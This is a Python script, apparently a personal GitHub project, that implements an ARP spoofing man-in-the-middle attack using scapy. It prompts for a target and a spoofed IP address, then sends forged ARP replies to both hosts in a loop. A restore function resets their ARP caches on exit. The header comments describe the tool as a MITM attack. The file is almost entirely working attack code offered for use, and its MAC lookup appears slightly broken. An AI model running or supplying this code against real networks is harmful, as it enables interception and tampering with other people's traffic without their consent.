'''                                         '''

    ########################################
    #         ARP Spoofer Script           #
    #       Ahmad Reza Parsi Zadeh         #
    #        github: ahmad-reza-ut         #
    ########################################

'''                                         '''

'''
            Important Notes:
        First you have to be familiar with packet manipulation
        and also have worked with scapy library in linux at least
        BE AWARE! DO NOT run this program while you are giving your
        ip address because while you are running this program you would be
        th victim and while program is running you can not access the internet:)
        But keep notice if you use restore function in the project actually 
        you are running a MITM attack while also victim can access the internet.

'''

#------------- ARP Spoofer -------------#
# Importing necessary libraries
from Imports import *

#------------------ Main ------------------#
def main():
    target_ip = input("Enter the target ip: ")
    spoofed_ip = input("Enter the spoofed ip: ")
    try:
        while True:
            ARP_Spoofer(target_ip, spoofed_ip)
            ARP_Spoofer(spoofed_ip, target_ip)
    except KeyboardInterrupt:
        restore(target_ip, spoofed_ip)
        restore(spoofed_ip, target_ip)
        exit(0)

#-------------- Restore function --------------#
def restore(destination_ip, source_ip):
    target_mac = get_target_mac(destination_ip)
    source_mac = get_target_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = target_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)
#-------------- MAC Getter function --------------#
def get_target_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    finalpacket = broadcast/arp_request
    answer = scapy.srp(finalpacket, timeout = 2, verbose = False)[0]
    mac = answer[0][1]
    return (mac)
#-------------- ARP Spoofer function --------------#
def ARP_Spoofer(target_ip, spoofed_ip):
    mac = get_target_mac(target_ip)
    packet = scapy.ARP(op = 2, hwdst = mac, pdst = target_ip, psrc = spoofed_ip)
    scapy.send(packet, verbose = False)
# ----------------------------#
if __name__ == "__main__":
    main()

#---------------- END ----------------#